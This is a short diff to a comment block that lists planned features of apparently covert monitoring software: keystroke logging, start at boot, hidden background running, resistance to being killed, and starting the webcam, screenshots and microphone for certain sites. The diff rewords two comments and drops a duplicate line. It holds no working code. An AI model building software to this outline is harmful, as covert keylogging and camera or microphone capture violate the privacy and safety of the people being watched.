@@ -1,8 +1,7 @@
-_/#Read key inputted into the system from the keyboard
+_/#Read key input from the keyboard
 #Runs on system startup
 #Runs in the background
-#Can not be killed
-#runs on Startup
+#Can not be kill
 #Webcam starter for certain sites
 #Screenshot starter for certain sites
 #Microphone starter
